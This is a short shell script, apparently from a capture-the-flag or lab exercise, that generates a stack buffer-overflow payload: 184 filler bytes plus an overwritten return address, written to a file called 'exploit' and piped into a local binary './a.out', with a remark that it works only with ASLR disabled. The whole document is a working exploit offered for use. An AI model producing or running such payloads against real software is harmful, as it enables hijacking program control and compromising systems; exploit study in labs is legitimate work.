#!/bin/sh

echo "[+] Bypass Sh4ll5"
echo "[+] This only works with ASLR turned off"

$(perl -e 'print "A"x184 . "\x40\x56\x55\x55\x55\x55"' > exploit)

echo "[+] The exploit is ready to be executed....."
echo "[+] Just do: ./a.out < exploit"
